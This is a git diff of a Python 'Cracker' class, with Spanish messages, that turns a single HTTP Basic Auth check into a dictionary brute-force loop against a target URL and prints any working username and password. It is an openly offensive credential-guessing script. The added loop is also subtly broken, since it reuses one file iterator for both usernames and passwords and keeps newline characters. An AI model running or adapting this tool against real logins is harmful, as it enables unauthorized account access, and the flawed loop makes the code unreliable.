@@ -3,18 +3,32 @@ import socket
 from requests.auth import HTTPBasicAuth, HTTPDigestAuth
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from htmlstructure import HTML
+from selenium import webdriver
 
 
 class Cracker:
     def __init__(self, url):
         self.numrequests = 0
         self.urlattack = url
+        self.username=""
+        self.password=""
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-    def basicauthcrack(self, username, password):
-        response = requests.get(self.urlattack, auth=HTTPBasicAuth(username, password))
-        if response.status_code == 200:
-            print('Usuario y contraseña válidos')
+    def basicauthcrack(self, dictionary):
+        dict=open(dictionary)
+        result=False
+        for linea in dict:
+            if result:
+                break
+            username=linea
+            for linea in dict:
+                password=linea
+                response = requests.get(self.urlattack, auth=HTTPBasicAuth(username, password))
+                if response.status_code == 200:
+                    result=True
+                    print('Usuario '+username+' y contraseña '+password+' válidos')
+                    break
+        dict.close()
 
     def digestauthcrack(self, username, password):
         response = requests.get(self.urlattack, auth=HTTPDigestAuth(username, password))
@@ -55,3 +69,4 @@ class Cracker:
             print('Usuario y contraseña válidos')
         else:
             print('Usuario y contraseña incorrectos')
+
